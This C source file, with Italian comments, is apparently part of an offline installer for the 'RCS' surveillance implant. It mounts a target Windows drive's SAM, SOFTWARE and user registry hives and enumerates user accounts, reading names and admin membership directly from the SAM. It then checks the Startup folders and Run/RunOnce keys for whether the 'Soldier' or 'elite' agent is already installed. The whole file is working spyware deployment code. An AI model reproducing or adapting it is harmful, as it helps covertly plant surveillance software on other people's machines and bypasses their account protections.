#include "stdafx.h"
#include "Functions_Users.h"
#include "user_identification.h"
#include "commons.h"
#include <Sddl.h>

DWORD GetRID(WCHAR *user_sid) 
{
	WCHAR *tmp_ptr;
	if (!(tmp_ptr = wcsrchr(user_sid, L'-')))
		return 0;

	return _wtoi(tmp_ptr+1);
}

WCHAR *GetLocalSettings(WCHAR *tmp_dir)
{
	WCHAR *temp_string, *ptr;
	DWORD len;

	temp_string = _wcsdup(tmp_dir);
	if (!temp_string)
		return NULL;

	len = wcslen(temp_string); 
	if (len == 0)
		return temp_string;
	if (temp_string[len-1] == L'\\')
		temp_string[len-1] = 0;

	ptr = wcsrchr(temp_string, L'\\');
	if (ptr)
		*ptr = 0;
	return temp_string;
}

BOOL WIN_IsAdmin(DWORD user_rid)
{
	WCHAR *members;
	DWORD group_count;
	DWORD *groups;
	DWORD i;
	WCHAR tmp_buf[1024];

	for (i=0;;i++) {
		if (!RegEnumSubKey(L"RCS_SAM\\SAM\\Domains\\Builtin\\Aliases\\Members\\", i, &members))
			break;

		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"RCS_SAM\\SAM\\Domains\\Builtin\\Aliases\\Members\\%s\\%08X", members, user_rid);
		SAFE_FREE(members);
		ReadRegValue(tmp_buf, NULL, &group_count, (WCHAR **)&groups);

		if (groups) {
			while (group_count--)
				if (groups[group_count] == 0x220) {
					SAFE_FREE(groups);
					return TRUE;
				}
			SAFE_FREE(groups);
		}
	}
	return FALSE;
}

DWORD WIN_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info)
{
	BOOL is_reg = FALSE;
	BOOL is_dir = FALSE;

	WCHAR rcs_dir[MAX_PATH+1];
	WCHAR *rcs_reg = NULL;
	HANDLE hfile;

	// Controlla se esiste il Soldier. Altrimenti prosegue a cercare l'elite
	swprintf_s(rcs_dir, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return RCS_INSTALLED;
	}

	// Controlla se esiste la chiave nel registry
	ReadRegValue(L"RCS_NTUSER\\software\\microsoft\\windows\\currentversion\\runonce", rcs_info->hreg, NULL, &rcs_reg);
	if (rcs_reg) {
		SAFE_FREE(rcs_reg);
		is_reg = TRUE;
	} else {
		ReadRegValue(L"RCS_NTUSER\\software\\microsoft\\windows\\currentversion\\run", rcs_info->hreg, NULL, &rcs_reg);
		if (rcs_reg) {
			SAFE_FREE(rcs_reg);
			is_reg = TRUE;
		} else {
			ReadRegValue(L"RCS_NTUSER\\software\\microsoft\\windows\\currentversion\\run", rcs_info->old_hreg, NULL, &rcs_reg);
			if (rcs_reg) {
				SAFE_FREE(rcs_reg);
				is_reg = TRUE;
			}
		}
	}

	// Controlla se esiste la directory vecchia
	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);	
	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		is_dir = TRUE;
	}
	// Controlla se esiste la directory
	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);	
	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		is_dir = TRUE;
	}

	if (!is_dir && !is_reg)
		return RCS_CLEAN;

	if (!is_reg || !is_dir)
		return RCS_BROKEN;

	return RCS_INSTALLED;
}

users_struct_t *WIN_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
{
	users_struct_t *list_head = NULL;
	users_struct_t **list_curr = NULL;
	struct user_V *vusr = NULL;
	struct user_F *fusr = NULL;
	WCHAR *user_name = NULL;
	WCHAR *user_sid = NULL;
	WCHAR *temp_home = NULL, *user_home = NULL;
	WCHAR *user_temp = NULL;
	WCHAR *user_startup = NULL;
	WCHAR *tmp_ptr;
	DWORD i, RID;
	WCHAR tmp_buf[1024];
	WCHAR sam_hive_path[MAX_PATH];
	WCHAR software_hive_path[MAX_PATH];
	HANDLE hfile;

	swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_info->drive, os_info->system_root, L"\\config\\software");
	swprintf_s(sam_hive_path, MAX_PATH, L"%s%s%s", os_info->drive, os_info->system_root, L"\\config\\sam");
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\", software_hive_path) != ERROR_SUCCESS) 
		return NULL;

	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SAM\\", sam_hive_path) != ERROR_SUCCESS) {
		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
		return NULL;
	}

	list_curr = &list_head;
	for (i=0;;i++) {
		// Cicla i profili (tramite i sid)
		if (!RegEnumSubKey(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\", i, &user_sid))
			break;

		// E' un utente di sistema
		if (wcsncmp(user_sid, L"S-1-5-21-", wcslen(L"S-1-5-21-"))) {
			SAFE_FREE(user_sid);
			continue;
		}

		// Prende la home
		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s\\", user_sid);
		ReadRegValue(tmp_buf, L"ProfileImagePath", NULL, &temp_home);
		if (!temp_home || !(tmp_ptr = wcschr(temp_home, L'\\'))) {
			SAFE_FREE(temp_home);
			SAFE_FREE(user_sid);
			continue;
		}
		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"%s%s", os_info->drive, tmp_ptr+1);
		SAFE_FREE(temp_home);
		if (!(user_home = _wcsdup(tmp_buf)))  {
			SAFE_FREE(user_sid);
			continue;
		}		
		
		// Carica l'hive dell'utente
		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"%s%s", user_home, L"\\ntuser.dat");
		if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\", tmp_buf) != ERROR_SUCCESS) {
			SAFE_FREE(user_sid);
			SAFE_FREE(user_home);
			continue;
		}
		
		// Legge la temp dell'utente
		ReadRegValue(L"RCS_NTUSER\\Environment\\", L"TEMP", NULL, &temp_home);
		if (!temp_home) {
			ReadRegValue(L"RCS_NTUSER\\Environment\\", L"TMP", NULL, &temp_home);
			if (!temp_home) {
				SAFE_FREE(user_sid);
				SAFE_FREE(user_home);
				RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
				continue;
			}
		}
		if (!(tmp_ptr = wcschr(temp_home, L'\\')) || !(user_temp = _wcsdup(tmp_ptr))) {
			SAFE_FREE(temp_home);
			SAFE_FREE(user_sid)
			SAFE_FREE(user_home);
			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
			continue;
		}
		SAFE_FREE(temp_home);

		// Legge la directory di StartUp dell'utente
		ReadRegValue(L"RCS_NTUSER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\", L"Startup", NULL, &temp_home);
		if (!temp_home) {
			SAFE_FREE(user_sid);
			SAFE_FREE(user_home);
			SAFE_FREE(user_temp);
			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
			continue;
		}
		if (!(tmp_ptr = wcschr(temp_home, L'\\')) || !(user_startup = (WCHAR *)calloc(1, MAX_PATH * sizeof(WCHAR)))) {
			SAFE_FREE(temp_home);
			SAFE_FREE(user_sid)
			SAFE_FREE(user_home);
			SAFE_FREE(user_temp);
			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
			continue;
		}
		swprintf_s(user_startup, MAX_PATH-1, L"%s%s", os_info->drive, tmp_ptr+1);
		SAFE_FREE(temp_home);

		// Verifica che esista la temp
		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"%s%s", user_home, user_temp);
		hfile = CreateFile(tmp_buf, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
		if (hfile == INVALID_HANDLE_VALUE) {
			SAFE_FREE(user_startup);
			SAFE_FREE(user_temp);
			SAFE_FREE(user_sid)
			SAFE_FREE(user_home);
			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
			continue;
		}
		CloseHandle(hfile);

		// Ora possiamo allocare la struttura perchè RCS è installabile
		// su quest'utente
		if ( !(*list_curr = (users_struct_t *)malloc(sizeof(users_struct_t))) ) {
			SAFE_FREE(user_startup);
			SAFE_FREE(user_temp);
			SAFE_FREE(user_sid)
			SAFE_FREE(user_home);
			RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
			continue;
		}

		// Imposta alcuni valori....
		memset((*list_curr), 0, sizeof(users_struct_t));
		(*list_curr)->user_home = user_home;
		(*list_curr)->user_temp = user_temp;
		(*list_curr)->user_startup = user_startup;
		(*list_curr)->user_local_settings = GetLocalSettings(user_temp);
		(*list_curr)->user_hash = GetUserHash(user_sid);
		(*list_curr)->rcs_status = WIN_GetUserRCSStatus((*list_curr), rcs_info);
		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");

		// Cerca di capire se è un utente locale
		swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s\\", user_sid);
		ReadRegValue(tmp_buf, L"Guid", NULL, &temp_home);
		// ...E' un utente di dominio
		if (temp_home) {
			SAFE_FREE(temp_home);
			(*list_curr)->is_local = FALSE;
			if (!(tmp_ptr = wcsrchr((*list_curr)->user_home, L'\\')) || !((*list_curr)->user_name = _wcsdup(tmp_ptr+1)))
				(*list_curr)->user_name = NULL;
			(*list_curr)->desc = _wcsdup(L"(Domain User)");
		} else { // è un utente locale
			(*list_curr)->is_local = TRUE;
			RID = GetRID(user_sid);

			swprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), L"RCS_SAM\\SAM\\Domains\\Account\\Users\\%08X", RID);
			// additional info 1
			ReadRegValue(tmp_buf, L"V", NULL, (WCHAR **)&vusr);
			if (vusr) {
				if (vusr->username_len) 
					if ((*list_curr)->user_name = (WCHAR *)calloc(vusr->username_len+2, 1))
						memcpy((*list_curr)->user_name, &(vusr->data[vusr->username_ofs]), vusr->username_len); 
				if (vusr->fullname_len) 
					if ((*list_curr)->full_name = (WCHAR *)calloc(vusr->fullname_len+2, 1))
						memcpy((*list_curr)->full_name, &(vusr->data[vusr->fullname_ofs]), vusr->fullname_len); 
				if (vusr->comment_len) 
					if ((*list_curr)->desc = (WCHAR *)calloc(vusr->comment_len+2, 1))
						memcpy((*list_curr)->desc, &(vusr->data[vusr->comment_ofs]), vusr->comment_len); 
				SAFE_FREE(vusr);
			}
			if (!(*list_curr)->user_name)
				if (!(tmp_ptr = wcsrchr((*list_curr)->user_home, L'\\')) || !((*list_curr)->user_name = _wcsdup(tmp_ptr+1)))
					(*list_curr)->user_name = NULL;

			// additional info 2 (user disabled)
			ReadRegValue(tmp_buf, L"F", NULL, (WCHAR **)&fusr);
			if (fusr) {
				if (fusr->ACB_bits & 1)
					(*list_curr)->is_disabled = TRUE;
				else
					(*list_curr)->is_disabled = FALSE;
				SAFE_FREE(fusr);
			}

			// Admin group?
			(*list_curr)->is_admin = WIN_IsAdmin(RID);
		}
		
		SAFE_FREE(user_sid); // è una informazione che non ci serve piu'
		// passa al successivo elemento della lista
		list_curr = &((*list_curr)->next);
	}
	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SAM\\");

	return list_head;
}
